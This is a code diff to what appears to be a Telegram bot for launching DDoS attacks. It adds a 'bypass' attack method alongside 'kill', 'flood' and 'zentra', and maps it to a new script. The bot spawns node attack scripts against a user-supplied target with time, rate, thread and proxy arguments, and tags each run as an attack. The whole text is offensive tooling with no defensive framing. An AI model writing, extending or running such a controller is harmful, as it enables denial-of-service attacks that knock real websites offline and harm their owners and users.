@@ -90,7 +90,7 @@ bot.onText(/\/methods/, async (msg) => {
 
   if (!isAdmin && !isGroupActive) return
 
-  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra')
+  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra, bypass')
 })
 
 bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
@@ -195,8 +195,8 @@ bot.on('message', async (msg) => {
       return
     }
 
-    if (!['kill', 'flood', 'zentra'].includes(method)) {
-      bot.sendMessage(id, 'Method must be "kill", "flood", or "zentra".')
+    if (!['kill', 'flood', 'zentra', 'bypass'].includes(method)) {
+      bot.sendMessage(id, 'Method must be "kill", "flood", "zentra", or "bypass".')
       return
     }
 
@@ -221,7 +221,7 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : './l7-zentra.js'
+    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : method === 'bypass' ? './bypass.js' : './l7-zentra.js'
     const cmdArgs = [scriptFile, target, time, rate, threads, proxy]
     const cmd = spawn('node', cmdArgs, { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
